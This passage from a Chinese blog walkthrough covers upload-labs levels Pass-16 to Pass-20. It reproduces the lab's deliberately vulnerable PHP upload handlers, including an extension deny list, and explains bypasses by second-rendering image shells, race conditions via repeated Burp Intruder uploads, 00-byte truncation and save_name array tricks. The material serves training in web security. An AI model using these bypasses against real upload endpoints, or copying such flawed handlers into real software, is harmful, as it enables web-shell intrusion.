+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>这里用到php_exif模块来判断文件类型，用图片马绕过，方法同pass-13</p>
+<h1 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h1><p>本人菜鸟请参考以下文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-13">请参考这篇文章</a></p>
+<p> 分析源码：</p>
+<p>​    判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.basename($filename);</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagejpeg($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagepng($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))</span><br><span class="line">        &#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                $newimagepath = UPLOAD_PATH.$newfilename;</span><br><span class="line">                imagegif($im,$newimagepath);</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.$newfilename;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h1><p>分析源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>​    这里是条件竞争，先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，否则删除，因此我们可以上传1.php只需要在它删除之前访问即可，可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</p>
+<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><p>分析源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    require_once(&quot;./myupload.php&quot;);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    switch ($status_code) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            $is_upload = true;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            break;</span><br><span class="line">        case 2:</span><br><span class="line">            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -1:</span><br><span class="line">            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -2:</span><br><span class="line">            $msg = &#x27;上传失败，上传目录不可写。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -3:</span><br><span class="line">            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -4:</span><br><span class="line">            $msg = &#x27;上传失败，上传的文件过大。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -5:</span><br><span class="line">            $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;;</span><br><span class="line">            break; </span><br><span class="line">        case -6:</span><br><span class="line">            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;</span><br><span class="line">            break;      </span><br><span class="line">        default:</span><br><span class="line">            $msg = &#x27;未知错误！&#x27;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//myupload.php</span><br><span class="line">class MyUpload&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  /** upload()</span><br><span class="line">   **</span><br><span class="line">   ** Method to upload the file.</span><br><span class="line">   ** This is the only method to call outside the class.</span><br><span class="line">   ** @para String name of directory we upload to</span><br><span class="line">   ** @returns void</span><br><span class="line">  **/</span><br><span class="line">  function upload( $dir )&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = $this-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;setDir( $dir );</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkExtension();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;checkSize();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if flag to check if the file exists is set to 1</span><br><span class="line">    </span><br><span class="line">    if( $this-&gt;cls_file_exists == 1 )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = $this-&gt;checkFileExists();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // if we are here, we are ready to move the file to destination</span><br><span class="line"></span><br><span class="line">    $ret = $this-&gt;move();</span><br><span class="line">    if( $ret != 1 )&#123;</span><br><span class="line">      return $this-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // check if we need to rename the file</span><br><span class="line"></span><br><span class="line">    if( $this-&gt;cls_rename_file == 1 )&#123;</span><br><span class="line">      $ret = $this-&gt;renameFile();</span><br><span class="line">      if( $ret != 1 )&#123;</span><br><span class="line">        return $this-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // if we are here, everything worked as planned :)</span><br><span class="line"></span><br><span class="line">    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>​    这关也存在条件竞争的问题，不过这题对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，因此可以通过不断上传图片马，由于条件竞争可能来不及重命名，从而上传成功。</p>
+<h1 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19 00截断"></a>Pass-19 00截断</h1><p>分析源码：</p>
+<p>​    发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，方法同pass-12</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><p>分析源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = explode(&#x27;.&#x27;, strtolower($file));</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>​    通过源码发现该过滤方式是以explode()函数把字符串打散为数组，end() 函数将数组内部指针指向最后一个元素，并返回该元素的值（如果成功），这里是取post参数数组中的最后一个文件名。reset() 函数将内部指针指向数组中的第一个元素并输出。可控点为save_name。save_name[3]=conn19.php，save_name[5]=jpg，$ext=jpg过白名单，</p>
+<p>​    reset($file)=conn19.php $file[1]=nul，就成功上传conn19.php.(多出个点但是windows自动去掉了没影响)。还可以尝试，1=conn19，2=php，3=jpg，或者Pass19的00截断，0=conn19.php(0x00)，1=jpg</p>
+<h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>​    本人在学习过程中遇到了许多的BUG，无法解决，有点心态爆炸。但还是坚持将靶场打完，所以过程中缺少了许多实操的图片。</p>
+<p>​    我参考多篇文章后写下这篇文章，所以这不能算是我的原创把。大家感兴趣的话可以点击以下连接查看参考文章：</p>
+<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/whitedream-/p/14501515.html">参考文章一</a></p>
+<p>​    <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44677409/article/details/92799366">参考文章二</a></p>
+<p>​    <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1740497">参考文章三</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/04/sqli-labs%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%EF%BC%89/" rel="prev" title="sqli-labs闯关详解（保姆级）">
+                  <i class="fa fa-chevron-left"></i> sqli-labs闯关详解（保姆级）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/11/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Upload/" rel="next" title="极客大挑战2019_Upload">
+                  极客大挑战2019_Upload <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ErYao7</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
